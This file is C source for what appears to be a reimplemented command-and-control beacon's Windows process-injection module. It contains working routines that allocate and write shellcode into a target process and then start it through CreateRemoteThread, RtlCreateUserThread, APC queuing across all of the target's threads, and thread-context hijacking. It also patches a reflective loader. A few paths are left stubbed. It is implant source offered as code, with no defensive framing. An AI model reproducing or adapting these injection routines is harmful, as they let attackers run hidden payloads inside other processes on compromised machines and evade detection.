#include "pch.h"

#include <tlhelp32.h>
#include <winternl.h>

#include "beacon.h"
#include "settings.h"

DWORD ExpandEnvironmentStrings_s(const char* lpSrc, char* lpDst, size_t size) {
	// determine the size of the buffer required to store the expanded string
	DWORD nSize = ExpandEnvironmentStringsA(lpSrc, NULL, 0);

	// if the size of the buffer is too small, return 0
	if (nSize == 0 || size <= nSize + 1) {
		return 0;
	}

	// expand the string
	return ExpandEnvironmentStringsA(lpSrc, lpDst, size);
}

char* gSpawnToX86 = NULL;
char* gSpawnToX64 = NULL;
DWORD SpawnToExpand(char* expanded, size_t size, BOOL x86)
{
	char lBuffer[256] = { 0 };

	char* spawnTo;
	if (x86)
	{
		if (gSpawnToX86 == NULL || strlen(gSpawnToX86) == 0)
		{
			spawnTo = S_SPAWNTO_X86;
		}
		else
		{
			LERROR("gSpawnToX86 is not NULL or empty");
		}
	}
	else
	{
		if (gSpawnToX64 == NULL || strlen(gSpawnToX64) == 0)
		{
			spawnTo = S_SPAWNTO_X64;
		}
		else
		{
			LERROR("gSpawnToX64 is not NULL or empty");
		}
	}

	snprintf(lBuffer, sizeof(lBuffer), "%s", spawnTo);
	return ExpandEnvironmentStrings_s(lBuffer, expanded, size);
}

#define MAX_CMD 256
void SpawnToFix(BOOL x86, char* cmd)
{
	memset(cmd, 0, MAX_CMD);
	SpawnToExpand(cmd, MAX_CMD, x86);

	if (!x86)
	{
		// look for the substring "sysnative" in cmd
		char* substr = strstr(cmd, "sysnative");
		if (!substr)
			return;

		char aux[MAX_CMD] = { 0 };
		memcpy(substr, "system32", STRLEN("system32"));

		// copy the rest of the string
		char* after = substr + STRLEN("sysnative");
		int afterLength = strlen(after);
		memcpy(aux, after, afterLength);

		memcpy(substr + STRLEN("system32"), aux, strlen(aux) + 1);
	}
}

/**
 * @brief Gets the spawn path based on the architecture.
 *
 * This function retrieves the spawn path depending on the architecture (x86 or x64).
 * The result is stored in the provided buffer after expanding any environment variables.
 *
 * @param x86 Flag indicating whether the architecture is x86 (TRUE) or x64 (FALSE).
 * @param buffer A pointer to the buffer where the spawn path will be stored.
 * @param length The size of the buffer in bytes.
 */
void BeaconGetSpawnTo(BOOL x86, char* buffer, int length)
{
	char cmd[MAX_CMD];
	SpawnToFix(x86, cmd);

	int size = min(length, MAX_CMD);
	memcpy(buffer, cmd, size);
}

typedef struct _INJECTION
{
	DWORD pid;
	HANDLE process;
	BOOL isX64;
	BOOL isProcessX64;
	BOOL isSameArchAsHostSystem;
	BOOL isSamePid;
	BOOL isTemporary;
	HANDLE thread;
} INJECTION;

;
typedef WINBASEAPI BOOL(WINAPI* FN_KERNEL32_ISWOW64PROCESS)(_In_ HANDLE hProcess, _Out_ PBOOL Wow64Process);
typedef WINBASEAPI HMODULE(WINAPI* FN_KERNEL32_LOADLIBRARYA)(_In_ LPCSTR lpLibFileName);
typedef WINBASEAPI FARPROC(WINAPI* FN_KERNEL32_GETPROCADDRESS)(_In_ HMODULE hModule, _In_ LPCSTR lpProcName);
typedef WINBASEAPI LPVOID(WINAPI* FN_KERNEL32_VIRTUALALLOC)(_In_opt_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flAllocationType, _In_ DWORD flProtect);
typedef WINBASEAPI BOOL(WINAPI* FN_KERNEL32_VIRTUALPROTECT)(_In_ LPVOID lpAddress, _In_ SIZE_T dwSize, _In_ DWORD flNewProtect, _Out_ PDWORD lpflOldProtect);

typedef CLIENT_ID *PCLIENT_ID;
typedef NTSTATUS(NTAPI* FN_NTDLL_RTLCREATEUSERTHREAD)(_In_ HANDLE ProcessHandle, _In_opt_ PSECURITY_DESCRIPTOR SecurityDescriptor, _In_ BOOLEAN CreateSuspended, _In_opt_ ULONG StackZeroBits, _In_opt_ SIZE_T StackReserve, _In_opt_ SIZE_T StackCommit, _In_ PVOID StartAddress, _In_opt_ PVOID Parameter, _Out_opt_ PHANDLE ThreadHandle, _Out_opt_ PCLIENT_ID ClientId);
typedef NTSTATUS(NTAPI* FN_NTDLL_NTQUEUEAPCTHREAD)(_In_ HANDLE ThreadHandle, _In_ PVOID ApcRoutine, _In_ PVOID ApcRoutineContext OPTIONAL, _In_ PVOID ApcStatusBlock OPTIONAL, _In_ PVOID ApcReserved OPTIONAL);

BOOL IsWow64ProcessEx(HANDLE hProcess)
{
	HMODULE hModule = GetModuleHandleA("kernel32");
	FN_KERNEL32_ISWOW64PROCESS _IsWow64Process = (FN_KERNEL32_ISWOW64PROCESS)GetProcAddress(hModule, "IsWow64Process");
	if (_IsWow64Process == NULL)
	{
		LERROR("kernel32$IsWow64Process: IsWow64Process is NULL");
		return FALSE;
	}

	BOOL Wow64Process = FALSE;
	return _IsWow64Process(hProcess, &Wow64Process) && Wow64Process;
}

BOOL IsProcess64Bit(HANDLE hProcess)
{
	if (!IS_X64() && !IsWow64ProcessEx(GetCurrentProcess()))
		return FALSE;

	return !IsWow64ProcessEx(hProcess);
}


typedef struct _PAYLOAD
{
	SHORT mzSignature;
	char _[982];
	FN_KERNEL32_LOADLIBRARYA pLoadLibraryA;
	FN_KERNEL32_GETPROCADDRESS pGetProcAddress;
	FN_KERNEL32_VIRTUALALLOC pVirtualAlloc;
	FN_KERNEL32_VIRTUALPROTECT pVirtualProtect;
	DWORD keyPtrMagic;
	DWORD smartInjectMagic;
} PAYLOAD;




char* InjectRemotely(INJECTION* injection, const char* payload, int size)
{
	/*if (S_PROCINJ_ALLOCATOR && injection->isX86NativeOrEmulated)
	{
		return InjectViaNtMapViewOfSection(injection->process, injection->pid, payload, size);
	}
	else
	{
		return InjectViaVirtualAllocEx(injection->process, injection->pid, payload, size);
	}*/
	return NULL;
}

BOOL AdjustMemoryPermissions(char* payload, int size) {
	if(S_PROCINJ_PERMS_I == S_PROCINJ_PERMS)
		return TRUE;

	DWORD flOldProtect;
	if (!VirtualProtect(payload, size, S_PROCINJ_PERMS, &flOldProtect))
	{
		DWORD lastError = GetLastError();
		LERROR("Could not adjust permissions in process: %s", LAST_ERROR_STR(lastError));
		BeaconErrorD(ERROR_ADJUST_PERMISSIONS_FAILED, lastError);
		return FALSE;
	}

	return TRUE;
}

char* InjectLocally(char* payload, int size)
{
	int dwSize = S_PROCINJ_MINALLOC;
	if (size > dwSize)
		dwSize = size + 1024;

	char* pAlloc = (char*)VirtualAlloc(NULL, dwSize, MEM_COMMIT | MEM_RESERVE, S_PROCINJ_PERMS_I);

	if (!pAlloc)
	{
		DWORD lastError = GetLastError();
		LERROR("Could not allocate %d bytes in process: %s", dwSize, LAST_ERROR_STR(lastError));
		BeaconErrorDD(ERROR_LOCAL_ALLOC_FAILED, dwSize, lastError);
		return NULL;
	}

	memcpy(pAlloc, payload, size);
	if (AdjustMemoryPermissions(pAlloc,dwSize))
	{
		return pAlloc;
	}

	VirtualFree(pAlloc, 0, MEM_RELEASE);

	return NULL;
}

BOOL ExecuteViaCreateRemoteThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
{
	return CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
}

BOOL ExecuteViaRtlCreateUserThread(HANDLE hProcess, LPVOID lpStartAddress, LPVOID lpParameter)
{
	HMODULE hModule = GetModuleHandleA("ntdll.dll");
	FN_NTDLL_RTLCREATEUSERTHREAD _RtlCreateUserThread = (FN_NTDLL_RTLCREATEUSERTHREAD)GetProcAddress(hModule, "RtlCreateUserThread");
	if (_RtlCreateUserThread == NULL)
	{
		LERROR("Cannot find RtlCreateUserThread in ntdll.dll");
		return FALSE;
	}

	CLIENT_ID ClientId;
	HANDLE hThread = NULL;
	_RtlCreateUserThread(hProcess, NULL, FALSE, 0, 0, 0, lpStartAddress, lpParameter, &hThread, &ClientId);
	return hThread != NULL;
}

BOOL ExecuteViaNtQueueApcThread_s(INJECTION* injection, LPVOID lpStartAddress, LPVOID lpParameter)
{
	HMODULE hModule = GetModuleHandleA("ntdll");
	FN_NTDLL_NTQUEUEAPCTHREAD _NtQueueApcThread = (FN_NTDLL_NTQUEUEAPCTHREAD)GetProcAddress(hModule, "NtQueueApcThread");

	if (_NtQueueApcThread == NULL)
		return FALSE;

	if (_NtQueueApcThread(injection->thread, lpStartAddress, lpParameter, NULL, NULL) != 0)
		return FALSE;

	return ResumeThread(injection->thread) != -1;
}


//CreateThread typedef
typedef HANDLE(WINAPI* FN_KERNEL32_CREATETHREAD)(_In_opt_ LPSECURITY_ATTRIBUTES lpThreadAttributes, _In_ SIZE_T dwStackSize, _In_ LPTHREAD_START_ROUTINE lpStartAddress, _In_opt_ __drv_aliasesMem LPVOID lpParameter, _In_ DWORD dwCreationFlags, _Out_opt_ LPDWORD lpThreadId);
typedef struct _APC_ROUTINE_CONTEXT
{
	LPVOID lpStartAddress;
	LPVOID lpAddress;
	FN_KERNEL32_CREATETHREAD pCreateThread;
	BOOL isExecuted;
	CHAR payload[];
} APC_ROUTINE_CONTEXT, *PAPC_ROUTINE_CONTEXT;

#if IS_X64()
#define TEB$ActivationContextStack() ((char*)NtCurrentTeb() + 0x2c8)
#else
#define TEB$ActivationContextStack() ((char*)NtCurrentTeb() + 0x1a8)
#endif

#pragma code_seg(push, ".text$KKK000")
__declspec(noinline) void NtQueueApcThreadProc(PAPC_ROUTINE_CONTEXT pData)
{
	if (pData->isExecuted)
		return;

	if (!(TEB$ActivationContextStack()))
		return;

	pData->isExecuted = TRUE;
	pData->pCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pData->lpStartAddress, pData->lpAddress, 0, NULL);
}
#pragma code_seg(pop)

#pragma code_seg(push, ".text$KKK001")
__declspec(noinline) void NtQueueApcThreadProc_End(void) {}
#pragma code_seg(pop)

BOOL ExecuteViaNtQueueApcThread(INJECTION* injection, LPVOID lpStartAddress, LPVOID lpParameter)
{
	HMODULE hModule = GetModuleHandleA("ntdll");
	FN_NTDLL_NTQUEUEAPCTHREAD _NtQueueApcThread = (FN_NTDLL_NTQUEUEAPCTHREAD)GetProcAddress(hModule, "NtQueueApcThread");

	SIZE_T payloadSize = (DWORD64)NtQueueApcThreadProc_End - (DWORD64)NtQueueApcThreadProc;
	SIZE_T dwSize = sizeof(APC_ROUTINE_CONTEXT) + payloadSize;
	PAPC_ROUTINE_CONTEXT pAllocedData = malloc(dwSize);
	if (!pAllocedData)
		return FALSE;

	APC_ROUTINE_CONTEXT data = (APC_ROUTINE_CONTEXT){ lpStartAddress, lpParameter, CreateThread, FALSE };
	*pAllocedData = data;
	memcpy(pAllocedData->payload, (PVOID)NtQueueApcThreadProc, payloadSize);
	APC_ROUTINE_CONTEXT* lpApcContext = VirtualAllocEx(injection->process, NULL, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

	SIZE_T wrote;
	if (lpApcContext && WriteProcessMemory(injection->process, lpApcContext, pAllocedData, dwSize, &wrote) && wrote != dwSize)
		lpApcContext = NULL;

	free(pAllocedData);

	if ((char*)lpApcContext == NULL)
		return FALSE;

	// Create a toolhelp snapshot of the process
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

	// Check if snapshot creation failed or there are no threads in the process
	THREADENTRY32 te32 = { sizeof(THREADENTRY32) };
	if (hSnapshot == INVALID_HANDLE_VALUE || hSnapshot == NULL || !Thread32First(hSnapshot, &te32))
		return FALSE;

	// Iterate through the threads in the snapshot
	do
	{
		// Check if the thread is in the process we want to inject into
		if (te32.th32OwnerProcessID != injection->pid)
			continue;

		// Open the thread
		HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, te32.th32ThreadID);
		if (hThread == NULL)
			continue;

		// Call the NtQueueApcThread function in the target process
		(_NtQueueApcThread)(hThread, lpApcContext->payload, lpApcContext, NULL, NULL);

		// Close the thread
		CloseHandle(hThread);
	} while (Thread32Next(hSnapshot, &te32));

	// Close the snapshot handle
	CloseHandle(hSnapshot);

	// Sleep to give the thread time to execute
	Sleep(200);

	// Read the APC thread data from the allocated memory
	SIZE_T read;
	if (!ReadProcessMemory(injection->process, lpApcContext, &data, sizeof(APC_ROUTINE_CONTEXT), &read) || read != sizeof(APC_ROUTINE_CONTEXT))
		return FALSE;

	// Return TRUE if the thread was executed
	if (data.isExecuted)
		return TRUE;

	// Mark the thread as executed and write it back to the allocated memory
	data.isExecuted = TRUE;
	WriteProcessMemory(injection->process, lpApcContext, &data, sizeof(APC_ROUTINE_CONTEXT), &read);
	return FALSE;
}

#define METHOD_CREATE_THREAD 1
#define METHOD_SET_THREAD_CONTEXT 2
#define METHOD_CREATE_REMOTE_THREAD 3
#define METHOD_RTL_CREATE_USER_THREAD 4
#define METHOD_NT_QUEUE_APC_THREAD 5
#define METHOD_CREATE_THREAD_S 6
#define METHOD_CREATE_REMOTE_THREAD_S 7
#define METHOD_NT_QUEUE_APC_THREAD_S 8

BOOL ExecuteViaCreateRemoteThread_s(DWORD option, HANDLE hProcess, LPVOID lpAddress, LPVOID lpParameter, LPCSTR lpModuleName, LPCSTR lpProcName, DWORD ordinal)
{
	HANDLE hModule = GetModuleHandleA(lpModuleName);
	BYTE* processAddress = (BYTE*)GetProcAddress(hModule, lpProcName);
	if (!processAddress)
		return FALSE;

	BYTE* finalAddress = processAddress + ordinal;
	HANDLE hThread;
	if (option == METHOD_CREATE_REMOTE_THREAD_S)
	{
		hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)finalAddress, lpParameter, CREATE_SUSPENDED, NULL);
	} else if (option == METHOD_CREATE_THREAD_S)
	{
		hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)finalAddress, lpParameter, CREATE_SUSPENDED, NULL);
	} else
	{
		return FALSE;
	}

	if (!hThread)
		return FALSE;

	CONTEXT context;
	context.ContextFlags = CONTEXT_FULL;

	if (!GetThreadContext(hThread, &context))
		return FALSE;

#if IS_X64()
	context.Rcx = (DWORD64)lpAddress;
#else
	context.Eax = (DWORD)lpAddress;
#endif

	if (!SetThreadContext(hThread, &context))
		return FALSE;

	return ResumeThread(hThread) != -1;
}

BOOL ExecuteViaSetThreadContext_x64(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter)
{
	CONTEXT context;
	context.ContextFlags = CONTEXT_INTEGER;

	if (!GetThreadContext(hThread, &context))
		return FALSE;

	context.Rcx = (DWORD64)lpStartAddress;
	context.Rdx = (DWORD64)lpParameter;

	if (!SetThreadContext(hThread, &context))
		return FALSE;

	return ResumeThread(hThread) != -1;
}

BOOL ExecuteViaSetThreadContext_x64_x86EmulationMode(HANDLE hThread, LPVOID lpStartAddress, LPVOID lpParameter)
{
	WOW64_CONTEXT context;
	context.ContextFlags = CONTEXT_INTEGER;

	if (!Wow64GetThreadContext(hThread, &context))
		return FALSE;

	context.Eax = (DWORD)lpStartAddress;

	if (!Wow64SetThreadContext(hThread, &context))
		return FALSE;

	return ResumeThread(hThread) != -1;
}


BOOL ExecuteViaSetThreadContext(INJECTION* injection, CHAR* lpStartAddress, LPVOID lpParameter)
{
	HANDLE hThread = injection->thread;

#if IS_X64()		
	if (!injection->isProcessX64)
	{
		WOW64_CONTEXT context;
		context.ContextFlags = CONTEXT_INTEGER;

		if (!Wow64GetThreadContext(hThread, &context))
			return FALSE;

		context.Eax = (DWORD)lpStartAddress;

		if (!Wow64SetThreadContext(hThread, &context))
			return FALSE;
	}
	else
#endif
	{
		CONTEXT context;
		context.ContextFlags = CONTEXT_INTEGER;

		if (!GetThreadContext(hThread, &context))
			return FALSE;

#if IS_X64()
		context.Rcx = (DWORD64)lpStartAddress;
		context.Rdx = (DWORD64)lpParameter;
#else
		context.Eax = (DWORD)lpStartAddress;
#endif

		if (!SetThreadContext(hThread, &context))
			return FALSE;
	}

	return ResumeThread(hThread) != -1;
}

BOOL ExecuteViaCreateThread(INJECTION* injection, CHAR* lpStartAddress, LPVOID lpParameter)
{
	return CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)lpStartAddress, lpParameter, 0, NULL) != NULL;
}

BOOL ExecuteInjection(INJECTION* injection, CHAR* lpStartAddress, DWORD offset, LPVOID lpParameter)
{
	datap parser;
	BeaconDataParse(&parser, S_PROCINJ_EXECUTE, 128);

	SHORT ordinal; CHAR* lpModuleName; CHAR* lpProcName;
	while(char method = BeaconDataByte(&parser))
	{
		switch(method)
		{
			case METHOD_CREATE_REMOTE_THREAD:
				if (ExecuteViaCreateRemoteThread(injection->process, lpStartAddress + offset, lpParameter))
					return TRUE;

				break;
			case METHOD_RTL_CREATE_USER_THREAD:
				if (ExecuteViaRtlCreateUserThread(injection->process, lpStartAddress + offset, lpParameter))
					return TRUE;

				break;
			case METHOD_NT_QUEUE_APC_THREAD_S:
				if (!injection->isTemporary || !injection->isSameArchAsHostSystem)
					continue;

				if (ExecuteViaNtQueueApcThread_s(injection, lpStartAddress + offset, lpParameter))
					return TRUE;

				break;
			case METHOD_CREATE_REMOTE_THREAD_S:
				ordinal = BeaconDataShort(&parser);
				lpModuleName = BeaconDataStringPointer(&parser);
				lpProcName = BeaconDataStringPointer(&parser);

				if (!injection->isSameArchAsHostSystem)
					continue;

				if (ExecuteViaCreateRemoteThread_s(METHOD_CREATE_REMOTE_THREAD_S, injection->process, lpStartAddress + offset, lpParameter, lpModuleName, lpProcName, ordinal))
					return TRUE;

				break;
			case METHOD_CREATE_THREAD_S:
				ordinal = BeaconDataShort(&parser);
				lpModuleName = BeaconDataStringPointer(&parser);
				lpProcName = BeaconDataStringPointer(&parser);

				if (!injection->isSamePid)
					continue;

				if (ExecuteViaCreateRemoteThread_s(METHOD_CREATE_THREAD_S, injection->process, lpStartAddress + offset, lpParameter, lpModuleName, lpProcName, ordinal))
					return TRUE;

				break;
			case METHOD_NT_QUEUE_APC_THREAD:
				if(injection->isSamePid || !injection->isSameArchAsHostSystem || injection->isTemporary)
					continue;

				if (ExecuteViaNtQueueApcThread(injection, lpStartAddress + offset, lpParameter))
					return TRUE;

				break;
			case METHOD_SET_THREAD_CONTEXT:
				if (!injection->isTemporary)
					continue;

				if (ExecuteViaSetThreadContext(injection, lpStartAddress + offset, lpParameter))
					return TRUE;

				break;
			case METHOD_CREATE_THREAD:
				if (!injection->isSamePid)
					continue;

				if (ExecuteViaCreateThread(injection, lpStartAddress + offset, lpParameter))
					return TRUE;

				break;
			default:
				return FALSE;
		}
	}
}

void InjectAndExecute(INJECTION* injection, char* payload, int size, int pOffset, char* parameter)
{
	char* target;
	if(injection->isSamePid)
		target = InjectLocally(payload, size);
	else
		target = InjectRemotely(injection, payload, size);

	if (!target)
		return;

	LTODO("Implement ExecuteInjection");
	return;
}

#define REFLECTIVE_LOADER_SIZE 51200
void BeaconInjectProcessInternal(PROCESS_INFORMATION* processInfo, HANDLE hProcess, int pid, char* payload, int pLen,
                                 int pOffset, char* str, int aLen)
{
	INJECTION injection;
	injection.pid = pid;
	injection.process = hProcess;
	injection.isX64 = IS_X64();
	injection.isProcessX64 = IsProcess64Bit(hProcess);
	injection.isSameArchAsHostSystem = injection.isProcessX64 == IS_X64();
	injection.isSamePid = pid == GetCurrentProcessId();
	injection.isTemporary = processInfo != NULL;
	injection.thread = injection.isTemporary ? processInfo->hThread : NULL;

	PAYLOAD* maskedPayload = (PAYLOAD*)payload;
	if (pLen >= REFLECTIVE_LOADER_SIZE && maskedPayload->mzSignature == IMAGE_DOS_SIGNATURE && maskedPayload->smartInjectMagic == 0xF4F4F4F4)
	{
		if (injection.isSameArchAsHostSystem)
		{
			maskedPayload->pGetProcAddress = GetProcAddress;
			maskedPayload->pLoadLibraryA = LoadLibraryA;
			maskedPayload->pVirtualAlloc = VirtualAlloc;
			maskedPayload->pVirtualProtect = VirtualProtect;

			maskedPayload->keyPtrMagic = 0xF00D;
		}
	}

	datap parser;
	BeaconDataParse(&parser, IS_X64() ? S_PROCINJ_TRANSFORM_X64 : S_PROCINJ_TRANSFORM_X86, 256);

	int prependSize = BeaconDataInt(&parser);
	char* prepend = BeaconDataPtr(&parser, prependSize);

	int appendSize = BeaconDataInt(&parser);
	char* append = BeaconDataPtr(&parser, appendSize);

	char* parameter;
	if (aLen <= 0)
		parameter = 0;
	else
		parameter = InjectRemotely(&injection, str, aLen);

	if (prependSize || appendSize)
	{
		formatp format;
		BeaconFormatAlloc(&format, prependSize + appendSize + pLen + 16);
		BeaconFormatAppend(&format, prepend, prependSize);
		BeaconFormatAppend(&format, payload, pLen);
		BeaconFormatAppend(&format, append, appendSize);

		pOffset += prependSize;

		pLen = BeaconFormatLength(&format);
		payload = BeaconFormatOriginal(&format);

		InjectAndExecute(&injection, payload, pLen, pOffset, parameter);
		BeaconFormatFree(&format);
	}
	else
	{
		InjectAndExecute(&injection, payload, pLen, pOffset, parameter);
	}
}


void BeaconInjectProcess(HANDLE hProcess, int pid, char* payload, int p_len, int p_offset, char* arg, int a_len)
{
	BeaconInjectProcessInternal(NULL, hProcess, pid, payload, p_len, p_offset, arg, a_len);
}
